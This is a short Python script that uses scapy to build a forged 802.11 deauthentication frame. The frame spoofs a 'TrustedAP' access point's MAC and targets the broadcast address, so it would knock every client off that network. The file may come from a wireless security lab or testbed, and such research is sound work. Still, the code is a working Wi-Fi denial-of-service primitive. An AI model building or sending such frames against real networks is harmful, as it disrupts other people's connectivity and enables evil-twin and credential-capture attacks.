from scapy.all import *
from scapy.layers.dot11 import *
import utils as utils

data = utils.load_json()

# MACS
AP_MAC = utils.get_mac("TrustedAP")[0]
STA_MACS = utils.get_mac("STA")

def deauth_frame(target_mac):
    # Create a deauthentication frame
    frameFCS = ( 
        Dot11FCS(
            proto = 0,
            type=0,
            subtype=12,
            FCfield = None,
            addr1=target_mac,
            addr2=AP_MAC,
            addr3=AP_MAC,
            SC=(1 << 4)
            ) /
        Dot11Deauth(reason=3)
    )

    return bytes(frameFCS)

def start_deauthentication_frame_generator():
    print("\nstart deauthentication frame generator")
    
    mac_sta = "FF:FF:FF:FF:FF:FF"

    raw_frame = deauth_frame(mac_sta)

    return raw_frame

